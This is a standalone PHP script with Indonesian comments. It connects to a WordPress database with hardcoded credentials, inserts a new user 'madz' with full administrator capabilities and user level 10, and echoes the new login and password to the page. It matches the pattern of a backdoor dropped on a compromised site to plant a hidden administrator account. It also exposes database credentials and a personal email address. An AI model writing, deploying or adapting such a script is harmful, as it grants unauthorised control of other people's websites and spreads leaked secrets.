<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Konfigurasi database
$db_host = 'localhost';
$db_name = 'u738590601_ajglo324';
$db_user = 'u738590601_ajglo3343';
$db_pass = 'pS]6KHX]L@(7U0!3';
$table_prefix = 'wp9f_';

// Data admin baru
$new_username = 'madz';
$new_password = 'Madz!@#2905'; 
$new_email    = 'jayredfire7@gmail.com';

try {
    // Membuat koneksi database
    $conn = new mysqli($db_host, $db_user, $db_pass, $db_name);

    // Cek koneksi
    if ($conn->connect_error) {
        throw new Exception("Koneksi database gagal: " . $conn->connect_error);
    }

    // Fungsi alternatif jika wp_hash_password tidak tersedia
    if (!function_exists('wp_hash_password')) {
        function wp_hash_password($password) {
            return password_hash($password, PASSWORD_DEFAULT);
        }
    }

    $password_hash = wp_hash_password($new_password);

    // Query 1: Menambahkan user baru
    $sql1 = $conn->prepare("INSERT INTO `{$table_prefix}users` 
        (user_login, user_pass, user_nicename, user_email, user_status, display_name, user_registered) 
        VALUES 
        (?, ?, ?, ?, 0, ?, NOW())");

    if (!$sql1) {
        throw new Exception("Prepare statement gagal: " . $conn->error);
    }

    $display_name = $new_username;
    $sql1->bind_param("sssss", $new_username, $password_hash, $new_username, $new_email, $display_name);

    if ($sql1->execute()) {
        $new_user_id = $conn->insert_id;

        // Query 2: Menambahkan hak akses admin
        $capabilities = serialize(array('administrator' => true));
        
        $sql2 = $conn->prepare("INSERT INTO `{$table_prefix}usermeta` (user_id, meta_key, meta_value) VALUES 
            (?, ?, ?), 
            (?, ?, ?)");
        
        if (!$sql2) {
            throw new Exception("Prepare statement gagal: " . $conn->error);
        }
        
        $meta_key1 = $table_prefix . 'capabilities';
        $meta_key2 = $table_prefix . 'user_level';
        $user_level = '10';
        
        $sql2->bind_param("isssis", 
            $new_user_id, $meta_key1, $capabilities,
            $new_user_id, $meta_key2, $user_level);

        if ($sql2->execute()) {
            echo "<h2>✅ Admin baru berhasil ditambahkan!</h2>";
            echo "<p>Username: <b>$new_username</b><br>Password: <b>$new_password</b></p>";
        } else {
            throw new Exception("Gagal menambahkan hak akses admin: " . $sql2->error);
        }
        
        $sql2->close();
    } else {
        throw new Exception("Gagal membuat user baru: " . $sql1->error);
    }

    $sql1->close();
    $conn->close();

} catch (Exception $e) {
    // Tangani error dengan lebih baik
    header('Content-Type: text/plain; charset=utf-8');
    echo "Terjadi kesalahan:\n";
    echo $e->getMessage();
    exit;
}
?>
